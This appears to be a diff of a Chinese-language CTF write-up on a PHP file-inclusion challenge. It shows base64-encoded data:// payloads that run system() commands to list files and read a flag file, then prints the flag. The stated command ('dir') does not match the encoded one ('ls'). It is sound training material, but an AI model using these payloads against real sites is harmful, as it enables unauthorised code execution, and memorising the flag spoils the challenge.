@@ -28,8 +28,14 @@ __0x01 解题__
 
 1. 引用<?php system("dir")?>，构造payload： ?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCJscyIpPz4=  （base64编码之前有过工具链接）
 
-2. 发现文件“fl4gisisish3r3.php”，采用<?php system("cat fl4gisisish3r3.php")?>,构造payload：data://text/plain/;base64,PD9waHAgc3lzdGVtKCJjYXQgZmw0Z2lzaXNpc2gzcjMucGhwIik/Pg==
+2. 发现文件“fl4gisisish3r3.php”，采用<?php system("cat fl4gisisish3r3.php")?>,构造
+
+payload:data://text/plain/;base64,PD9waHAgc3lzdGVtKCJjYXQgZmw0Z2lzaXNpc2gzcjMucGhwIik/Pg==
 
 __0x02 答案__
 
 得到flag：ctf{876a5fca-96c6-4cbd-9075-46f0c89475d2}
+
+> 不是总结，但是后话
+>
+> 这个题方法应该有很多，就光见到的wp就用很多种，鉴于个人水平有限就提一种，未完待续...
